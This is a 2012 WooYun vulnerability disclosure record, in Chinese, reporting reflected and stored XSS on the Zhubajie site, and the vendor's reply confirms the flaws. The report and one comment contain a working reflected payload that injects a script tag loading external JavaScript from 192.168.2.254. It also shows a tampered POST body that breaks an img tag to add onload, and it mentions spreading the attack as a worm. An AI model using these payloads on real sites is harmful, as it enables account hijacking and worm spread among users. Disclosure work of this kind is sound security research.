{"id": 16696, "wybug_id": "wooyun-2012-012168", "wybug_title": "送上猪八戒网xss 2枚（可蠕虫）", "wybug_corp": "猪八戒网", "wybug_author": "啤酒", "wybug_date": "2012-09-14 10:51", "wybug_open_date": "2012-10-29 10:51", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-09-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-09-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-10-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-10-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-10-29：\t细节向公众公开  简要描述： 猪八戒网一个反射型xss和储存型xss 详细说明：  先说反射型先感谢@possible 大牛给的点。猪八戒网貌似用的第三方的输入输出防火墙. 各种符号过滤包括冒号，唯独没有过滤<>貌似你的第三方只过滤注入。而且是用一大串的n个\\\\\\\\转义， html标签可不认这个转义\" 号就可阻断了这防火墙真的很奇葩啊。于是有了下面的反射型.http://search.zhubajie.com/?qa=</title><script src=//192.168.2.254/all.js> </script><title>titile 标签 闭合然后写入script标签 测试的时候发现 http://加不进去 是过滤了：号 没事ie会自己补http:// 这样干净的绕过输入过滤机制引入外部js ie6的随便打了.猪八戒站内的各种互动,把连接用短网址伪装好.发给人点，点了后再顺便把点的人也感染一番，然后下面的人继续点.接着又和@possible讨论按照八戒的用的防漏洞的机制估计整站都是用的这个产品不难想象这样的转义过滤多半存在储存型，于是继续挖果然不出所料。\n\n接着说储存型的http://quan.zhubajie.com/thread-index-threadid-141832-page-21.html猪圈的编辑器有个插表情的功能这样的ubb编辑器一看基本上都有储存了于是顺手测了下真的有   复现流程 登录猪圈http://quan.zhubajie.com/打开抓包工具，点击俯卧撑表情提交，在抓包工具里面截获post包得到\n\n在%5d前面加入%22 (双引号)发出去修改包前：\nthreadid=141832&message=+%5Bimg%3D%E4%BF%AF%E5%8D%A7%E6%92%91%5Dhttp%3A%2F%2Fs.zbjimg.com%2Fubb%2Fxheditor_emot%2Fdefault%2F8.gif%5B%2Fimg%5D&tagid=5216\n改包后：\nthreadid=141832&message=+%5Bimg%3D%E4%BF%AF%E5%8D%A7%E6%92%91%22%5Dhttp%3A%2F%2Fs.zbjimg.com%2Fubb%2Fxheditor_emot%2Fdefault%2F8.gif%5B%2Fimg%5D&tagid=5216\n回到页面可见img标签已经被阻断了那么就加入onload 过程不详述了看图\n\n\n\n由此产生储存型.页面排版已经乱了onload已经加进去了这里我没有使用alert 是不想在这个帖子弹。测的时候这个帖子可热着.   漏洞证明：  \n\nhttp://quan.zhubajie.com/thread-index-threadid-141832-page-21.html用开发人员工具定位看dom   修复方案：  过滤   版权声明：转载请注明来源 啤酒@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-09-14 15:10 厂商回复： 感谢提醒，我们尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-09-14 15:00 |    \t\t啤酒 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 道不同.喝酒结盟)\t\t \n  八戒的修复还是很快的.不过不彻底还有..    \n     2012-09-14 15:16 |    \t\t啤酒 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 道不同.喝酒结盟)\t\t \n   @猪八戒网 那再提醒一下吧：http://search.zhubajie.com/?qa=\"</title><script src=//192.168.2.254/all.js></script><title> 过滤双引号..亲    \n     2012-09-14 15:56 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  这个可以还算一个 再发呵呵    \n     2012-09-14 16:10 |    \t\t啤酒 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:8        | 道不同.喝酒结盟)\t\t \n  @possible 算了反射型的再发也没啥意思了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}